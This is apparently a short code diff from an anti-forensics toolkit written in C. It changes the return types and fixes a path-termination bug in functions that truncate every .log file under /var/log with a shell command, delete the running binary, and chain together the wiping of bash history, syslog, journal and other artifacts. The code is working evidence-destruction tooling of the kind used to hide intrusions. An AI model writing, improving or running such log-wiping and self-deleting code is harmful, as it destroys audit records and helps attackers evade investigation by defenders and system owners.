@@ -53,10 +53,8 @@ int jocky_wipe_prefetch(void) {
     return 0;
 }
 
-int jocky_clear_logs(void) {
-    /* Clear all log files */
+void jocky_clear_logs(void) {
     system("find /var/log -type f -name '*.log' -exec truncate -s 0 {} \\; 2>/dev/null");
-    return 0;
 }
 
 int jocky_clear_srum(void) {
@@ -64,14 +62,10 @@ int jocky_clear_srum(void) {
     return 0;
 }
 
-int jocky_self_delete(void) {
-    /* Delete the current binary */
+void jocky_self_delete(void) {
     char path[256];
-    if (readlink("/proc/self/exe", path, sizeof(path) - 1) > 0) {
-        remove(path);
-        return 0;
-    }
-    return -1;
+    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    if (len > 0) { path[len] = '\0'; remove(path); }
 }
 
 int32_t forensics_flush_arp_cache(void) {
@@ -84,12 +78,11 @@ int32_t forensics_clear_dns_cache(void) {
     return 1;
 }
 
-int jocky_cleanup_all(void) {
+void jocky_cleanup_all(void) {
     linux_forensics_wipe_bash_history();
     jocky_linux_cleanup_syslog();
     jocky_linux_cleanup_journal();
     jocky_wipe_artifacts(NULL);
     jocky_wipe_prefetch();
     jocky_clear_logs();
-    return 0;
 }
